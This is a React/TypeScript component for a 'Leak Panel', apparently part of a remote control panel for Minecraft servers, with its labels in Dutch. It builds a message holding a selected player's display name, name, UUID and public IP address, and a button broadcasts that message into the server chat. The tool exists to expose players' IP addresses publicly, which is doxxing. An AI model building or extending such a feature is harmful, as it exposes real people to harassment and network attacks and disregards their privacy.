import { CircularProgress, TextareaAutosize, Tooltip } from "@mui/material";
import "./PanelStyle.scss";
import "./LeakPanelStyle.scss";

import { socket } from "../../../../../socket/socket";
import { FaFileUpload } from "react-icons/fa";
import { useEffect, useState } from "react";
import IServer from "../../../../../interfaces/IServer";
import IPlayer from "../../../../../interfaces/IPlayer";

function LeakPanel(props: { server: IServer; player: IPlayer | null }) {
  const [message, setMessage] = useState<string[]>([]);

  function leakPlayer() {
    //Array to string for handy placeholder replacement
    socket.emit(
      "feature:player",
      socket.id,
      props.server.id,
      props.player?.uuid,
      "leak",
      { Message: message.toString() }
    );
  }
  function onMessageChange(e: any) {
    var splitted: string[] = e.target.value.split("\n");
    setMessage(splitted);
  }
  useEffect(() => {
    function loadText() {
      setMessage([
        "§4§lBELANGRIJK",
        "§6§l§m--------------",
        "§eDisplayname:§7 %displayname%",
        "§eName:§7 %name%",
        "§eUUID:§7 %uuid%",
        "§ePublic IP:§c§l %ip%",
        "§6§l§m--------------",
      ]);
    }
    loadText();
  }, []);
  if (props.player === null) {
    return <CircularProgress />;
  }
  return (
    <>
      <div className="panel-header">
        Leak Panel - {props.player.displayname}
      </div>
      <div className="panel-line"></div>
      <div className="leakpanel-container">
        <div className="leakpanel-buttons">
          <textarea
            onChange={onMessageChange}
            value={message
              .map((line: string, index: number) => {
                if (index + 1 === message.length) return line;
                else return line + "\n";
              })
              .join("")}
            placeholder="Geef een leak message..."
            style={{
              width: 300,
              height: 160,
              maxWidth: "100%",
              minWidth: 300,
              minHeight: 30,
            }}
          />
          <p>
            Volgende placeholders zijn beschikbaar:<br></br>
            <span style={{ color: "gray" }}>
              | %displayname% | %name% | %uuid% | %ip% |
            </span>
          </p>
          <Tooltip
            title="Leak de data van de speler in de chat"
            onClick={() => leakPlayer()}
          >
            <div className="leakpanel-buttons-button">
              <FaFileUpload />
              Leak Speler
            </div>
          </Tooltip>
        </div>
      </div>
    </>
  );
}
export default LeakPanel;
